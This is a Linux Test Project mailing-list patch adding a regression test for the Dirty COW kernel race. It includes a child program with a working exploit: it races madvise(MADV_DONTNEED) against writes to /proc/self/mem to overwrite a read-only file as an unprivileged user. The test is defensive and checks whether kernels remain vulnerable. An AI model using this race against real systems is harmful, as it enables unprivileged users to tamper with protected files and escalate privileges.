From: Cyril Hrubis <chrubis@suse.cz>
Date: Tue, 1 Nov 2016 10:25:42 +0100
Subject: [LTP] [COMMITTED] [PATCH 2/2] security/dirtyc0w: Add new test.
Message-ID: <20161101092542.GA18331@rei.lan>
List-Id: <ltp.lists.linux.it>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: ltp@lists.linux.it

Based on: https://github.com/dirtycow/dirtycow.github.io

Signed-off-by: Cyril Hrubis <chrubis@suse.cz>
---
 runtest/syscalls                                   |   1 +
 testcases/kernel/security/dirtyc0w/.gitignore      |   2 +
 testcases/kernel/security/dirtyc0w/Makefile        |  21 ++++
 testcases/kernel/security/dirtyc0w/dirtyc0w.c      | 112 +++++++++++++++++++
 .../kernel/security/dirtyc0w/dirtyc0w_child.c      | 121 +++++++++++++++++++++
 5 files changed, 257 insertions(+)
 create mode 100644 testcases/kernel/security/dirtyc0w/.gitignore
 create mode 100644 testcases/kernel/security/dirtyc0w/Makefile
 create mode 100644 testcases/kernel/security/dirtyc0w/dirtyc0w.c
 create mode 100644 testcases/kernel/security/dirtyc0w/dirtyc0w_child.c

diff --git a/runtest/syscalls b/runtest/syscalls
index b781241..7c84296 100644
--- a/runtest/syscalls
+++ b/runtest/syscalls
@@ -804,6 +804,7 @@ process_vm_writev01 process_vm01 -w
 process_vm_writev02 process_vm_writev02
 
 prot_hsymlinks prot_hsymlinks
+dirtyc0w dirtyc0w
 
 pselect01 pselect01
 pselect01_64 pselect01_64
diff --git a/testcases/kernel/security/dirtyc0w/.gitignore b/testcases/kernel/security/dirtyc0w/.gitignore
new file mode 100644
index 0000000..7700d91
--- /dev/null
+++ b/testcases/kernel/security/dirtyc0w/.gitignore
@@ -0,0 +1,2 @@
+dirtyc0w
+dirtyc0w_child
diff --git a/testcases/kernel/security/dirtyc0w/Makefile b/testcases/kernel/security/dirtyc0w/Makefile
new file mode 100644
index 0000000..aef8a9a
--- /dev/null
+++ b/testcases/kernel/security/dirtyc0w/Makefile
@@ -0,0 +1,21 @@
+# Copyright (c) 2016 Linux Test Project
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 2 of
+# the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it would be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write the Free Software Foundation,
+# Inc.,  51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+
+top_srcdir		?= ../../../..
+
+include $(top_srcdir)/include/mk/testcases.mk
+dirtyc0w_child: CFLAGS+=-pthread
+include $(top_srcdir)/include/mk/generic_leaf_target.mk
diff --git a/testcases/kernel/security/dirtyc0w/dirtyc0w.c b/testcases/kernel/security/dirtyc0w/dirtyc0w.c
new file mode 100644
index 0000000..fdf5d24
--- /dev/null
+++ b/testcases/kernel/security/dirtyc0w/dirtyc0w.c
@@ -0,0 +1,112 @@
+/*
+ * Copyright (c) 2016 Cyril Hrubis <chrubis@suse.cz>
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program. If not, see <http://www.gnu.org/licenses/>.
+ */
+
+/*
+ * This is a regression test for write race that allows unprivileged programs
+ * to change readonly files on the system.
+ *
+ * It has been fixed long time ago:
+ *
+ *   commit 4ceb5db9757aaeadcf8fbbf97d76bd42aa4df0d6
+ *   Author: Linus Torvalds <torvalds@g5.osdl.org>
+ *   Date:   Mon Aug 1 11:14:49 2005 -0700
+ *
+ *   Fix get_user_pages() race for write access
+ *
+ * Then it reappeared and was fixed again in:
+ *
+ *   commit 19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
+ *   Author: Linus Torvalds <torvalds@linux-foundation.org>
+ *   Date:   Thu Oct 13 20:07:36 2016 GMT
+ *
+ *   mm: remove gup_flags FOLL_WRITE games from __get_user_pages()
+ */
+
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdlib.h>
+#include <pwd.h>
+
+#include "tst_test.h"
+
+#define FNAME "test"
+#define STR   "this is not a test\n"
+
+static uid_t nobody_uid;
+static gid_t nobody_gid;
+
+static void setup(void)
+{
+	struct passwd *pw;
+
+	pw = SAFE_GETPWNAM("nobody");
+
+	nobody_uid = pw->pw_uid;
+	nobody_gid = pw->pw_gid;
+}
+
+void dirtyc0w_test(void)
+{
+	int i, fd, pid, fail = 0;
+	char c;
+
+	/* Create file */
+	fd = SAFE_OPEN(FNAME, O_WRONLY|O_CREAT|O_EXCL, 0444);
+	SAFE_WRITE(1, fd, STR, sizeof(STR)-1);
+	SAFE_CLOSE(fd);
+
+	pid = SAFE_FORK();
+
+	if (!pid) {
+		SAFE_SETGID(nobody_gid);
+		SAFE_SETUID(nobody_uid);
+		SAFE_EXECLP("dirtyc0w_child", "dirtyc0w_child", NULL);
+	}
+
+	for (i = 0; i < 100; i++)  {
+		usleep(10000);
+
+		SAFE_FILE_SCANF(FNAME, "%c", &c);
+
+		if (c != 't') {
+			fail = 1;
+			break;
+		}
+	}
+
+	SAFE_KILL(pid, SIGUSR1);
+	tst_reap_children();
+	SAFE_UNLINK(FNAME);
+
+	if (fail)
+		tst_res(TFAIL, "Bug reproduced!");
+	else
+		tst_res(TPASS, "Bug not reproduced");
+}
+
+static struct tst_test test = {
+	.tid = "dirtyc0w",
+	.needs_tmpdir = 1,
+	.forks_child = 1,
+	.needs_root = 1,
+	.setup = setup,
+	.test_all = dirtyc0w_test,
+};
diff --git a/testcases/kernel/security/dirtyc0w/dirtyc0w_child.c b/testcases/kernel/security/dirtyc0w/dirtyc0w_child.c
new file mode 100644
index 0000000..159716c
--- /dev/null
+++ b/testcases/kernel/security/dirtyc0w/dirtyc0w_child.c
@@ -0,0 +1,121 @@
+/*
+ * Copyright (c) 2016 Cyril Hrubis <chrubis@suse.cz>
+ *  Based on: https://github.com/dirtycow/dirtycow.github.io
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program. If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdlib.h>
+#include <pwd.h>
+
+#define TST_NO_DEFAULT_MAIN
+#include "tst_test.h"
+
+#define FNAME "test"
+#define STR   "this is not a test\n"
+
+static char *str = "m00000000000000000";
+static void *map;
+static int mfd;
+
+/*
+ * You have to race madvise(MADV_DONTNEED) ::
+ * https://access.redhat.com/security/vulnerabilities/2706661
+ *
+ * This is achieved by racing the madvise(MADV_DONTNEED) system call while
+ * having the page of the executable mmapped in memory.
+ */
+static void *madvise_thread(void *arg)
+{
+	int c = 0;
+
+	(void)arg;
+
+	while (1)
+		c += madvise(map, 100, MADV_DONTNEED);
+
+	tst_res(TINFO, "madvise: %i", c);
+
+	return NULL;
+}
+
+/*
+ * You have to write to /proc/self/mem ::
+ * https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
+ *
+ * The in the wild exploit we are aware of doesn't work on Red Hat Enterprise
+ * Linux 5 and 6 out of the box because on one side of the race it writes to
+ * /proc/self/mem, but /proc/self/mem is not writable on Red Hat Enterprise
+ * Linux 5 and 6.
+ */
+void *proc_self_mem_thread(void *arg)
+{
+	int c = 0;
+
+	(void)arg;
+
+	while (1) {
+		lseek(mfd, (uintptr_t) map, SEEK_SET);
+		c += write(mfd, str, strlen(str));
+	}
+
+	tst_res(TINFO, "write: %i", c);
+
+	return NULL;
+}
+
+void sighandler(int sig)
+{
+	(void) sig;
+
+	_exit(0);
+}
+
+/*
+ * You have to use MAP_PRIVATE for copy-on-write mapping.
+ * Create a private copy-on-write mapping. Updates to the
+ * mapping are not visible to other processes mapping the same
+ * file, and are not carried through to the underlying file. It
+ * is unspecified whether changes made to the file after the
+ * mmap() call are visible in the mapped region.
+ */
+int main(void)
+{
+	pthread_t pth1, pth2;
+	int fd;
+	struct stat st;
+
+	SAFE_SIGNAL(SIGUSR1, sighandler);
+
+	/* Open it read only and map */
+	fd = SAFE_OPEN(FNAME, O_RDONLY);
+	SAFE_FSTAT(fd, &st);
+
+	map = SAFE_MMAP(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+	mfd = SAFE_OPEN("/proc/self/mem", O_RDWR);
+
+	/* Try to rewrite it */
+	SAFE_PTHREAD_CREATE(&pth1, NULL, madvise_thread, NULL);
+	SAFE_PTHREAD_CREATE(&pth2, NULL, proc_self_mem_thread, NULL);
+
+	pause();
+
+	return 0;
+}
-- 
2.7.3


-- 
Cyril Hrubis
chrubis@suse.cz
